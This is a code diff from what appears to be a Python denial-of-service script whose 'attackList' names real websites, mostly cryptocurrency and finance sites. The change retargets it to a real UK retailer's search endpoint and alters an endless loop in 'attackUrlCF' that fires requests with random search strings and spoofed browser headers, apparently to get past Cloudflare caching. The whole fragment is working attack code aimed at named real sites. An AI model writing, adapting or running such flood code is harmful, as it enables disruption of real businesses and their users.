@@ -20,7 +20,8 @@ attackList = [
 # 'https://cryptonaute.fr',
 # 'https://www.finaria.it',
 # 'https://icowatchlist.com',
-'https://coincierge.de',
+# 'https://coincierge.de',
+'https://grunwerg.co.uk/search?type=product%2Carticle%2Cpage&options%5Bprefix%5D=last&q='
 # 'https://tradingplatforms.com'
 ]
 
@@ -99,7 +100,8 @@ def attackUrlCF(baseUrl):
 
 	while True:
 		try:
-			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
+			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
+			url = baseUrl + ''.join(random.choice(letters) for i in range(10)) 
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
